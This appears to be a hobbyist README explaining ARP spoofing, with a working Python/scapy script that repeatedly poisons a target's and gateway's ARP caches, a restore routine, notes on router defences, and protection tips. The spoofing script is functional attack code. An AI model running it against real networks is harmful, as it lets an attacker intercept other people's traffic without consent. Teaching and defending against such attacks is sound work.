# How to check if your router tries to protect you

**ARP Spoofing** also known as Man in the Middle is simple but powerful attack. It exploits the vulnerabilites of ARP (Address Resolution Protocol)

-------------------------------------------------------------------------------

## How ARP Spoofing Works

Normally these are how the computers in a network communicate (this works for ethernet switches).  

![Load](https://documentation.meraki.com/@api/deki/files/5903/Screen_Shot_2017-12-03_at_8.09.11_PM.png?revision=1&size=bestfit&width=622&height=242)

The victim (who is not the victim yet) sends an ARP broadcast to ask what are the MAC addresses of the machines with the given IP. For example, the ARP request asks who 10.10.10.20 is, the router has that IP and the router sends its MAC address to the machine that asked. The machine will then update its table so whenever it needs to send something to 10.10.10.20, it will send it to the MAC address that was given. You may now see what the vulnerability is. I could send a message to the victim saying that I'm 10.10.10.20 but give it **MY** MAC address. Now when it needs to send something to 10.10.10.20, it will send the requests to my MAC address. *The **power** feels great!*

![Get rekt](https://miro.medium.com/max/4800/1*Nz1e4AfW6HGcgXde_eIwUg.jpeg)

-------------------------------------------------------------------------------

## How the Code Works

Remember, we need to tell the victim that we're the router, so we'll create a packet doing just that. I should also say I used the library scapy.
```python
def spoof(targetip, targetmac, sourceip):
    spoofed = ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
    send(spoofed, verbose= False)
```
What this does is create a packet with packet destination (pdst) of the target, this tells them this packet was especially made for them, packet source (psrc) of the router so it looks like it's coming from them, and hwdst (hardware destination) is to send it to the right person. This packet will have a hwsrc (hardware source) of our IP so they associate our MAC address with the router's IP. 
```python
def restorearp(targetip, targetmac, sourceip, sourcemac):
    packet = ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
    send(packet, verbose=False)
    print("ARP Table restored to normal for", targetip)
```
The code above is to reverse previous actions, telling the victim that the IP of router should be associated with the MAC of the router. You literally have to reverse it, showing the **power** of the attack. 
```python
def main():
    targetip = "192.168.0.24"
    gatewayip = "192.168.0.1"
    targetmac = "a4:5e:60:b9:d6:ab"
    gatewaymac = "9c:c9:eb:c9:1a:1a"

    try:
        print("Sending spoofed ARP responses")
        #restorearp(gatewayip, gatewaymac, targetip, targetmac)
        #restorearp(targetip, targetmac, gatewayip, gatewaymac)
        while True:
            spoof(targetip, targetmac, gatewayip)
            spoof(gatewayip, gatewaymac, targetip)
    except KeyboardInterrupt:
        print("ARP spoofing stopped")
        restorearp(gatewayip, gatewaymac, targetip, targetmac)
        restorearp(targetip, targetmac, gatewayip, gatewaymac)
        quit()

if __name__=="__main__":
    main()
``` 
Here I specify the IP addresses and MAC addresses. You could automate this part, but if you have something like nmap or a network scanner (you can code this as well) you can find the addresses and manually code them in. Then we send the packets, we have to do this repeatedly so the victim thinks we're the router. If you want to turn it off, you can use Ctrl+C and it'll revert it. 

-------------------------------------------------------------------------------

## Why it may not work for you

I wasn't initially planning on making this section, but we got a new router and the spoofer doesn't work anymore. This is actually a good thing, but not for this project. I started doing research to figure out what happened,

![Literally Me](https://pbs.twimg.com/media/EIzT11bU8AAgvlM.jpg)

I was enlightened with the knowledge of this random stackoverflow dude

>The spoof should work almost immediately if it is working properly. New devices will see the gratuitous arp from the attacker and automatically update their >cache. A victim will not detect duplicate IP, they should just update the mapping. The problem is likely at the router.
>
>Arpspoof works through a switch because the switch has no way of knowing which port the legitimate IP address/MAC mapping is, so without any form of port >security/DHCP snooping/Dynamic arp inspection, it has to trust that a device is who it says it is when it claims "192.168.1.1 is at aa:bb:cc:dd:ee:aa" in its >arp reply/gratuitous arp.
>
>~Some dude on Stack Overflow

What this basically says is the router is being skeptical. ARP Spoofing depends a lot on the router trusting the hacker's computer. The switch is doing what we want it to do, but the router is detecting something fishy from the hacker's computer.

-------------------------------------------------------------------------------

## How to protect yourself from ARP Spoofers

I hope I demostrated how easy it is to do such a thing. I lucked out when the router stopped the spoofer. Here are some tips to protect yourself

1. Setup a packet filter
    * This is a great way to prevent "posioned" packets from reaching your computer
2. Use Malware Detection Tools 
    * These can indicate that someone is trying to get into your machine
3. Use an ARP Detection Tool
    * Similar to the last one, these tools can be more focused on ARP. However downloading a tool for each vulnerability can add up. 
4. Avoid Trust Relationships
    * You should disable trust relationships. These are connections that automatically connect themselves. Trust is a huge part of ARP Spoofing and this is akin    to going for the head. Use password or some sort of authenication as works to do this. 
5. Use Static ARP 
    * If you have two machines that communicate often (ex. You and your router), try setting up a Static ARP cache. This connection can't be changed without your knowledge. This along with #4 is a great way to protect yourself.

-------------------------------------------------------------------------------

## What I learned

 I must the router screwing up everything led to me learning a lot more than what I would've. 
 
 1. ARP Spoofing, I learned what ARP Spoofing is and how to do it.
 2. nmap and netstat, I used these programs to find IP and MAC addresses.
 3. MacPorts, Port forwarding, IP forwarding, I had to enable these to get it to work.
 4. A bunch of command line stuff, I learned more about command line and different ways to troubleshoot using terminal.
 5. Scapy, I used the library scapy to create packages. 
 6. A lot about networks, permissions, and many other things. 
 
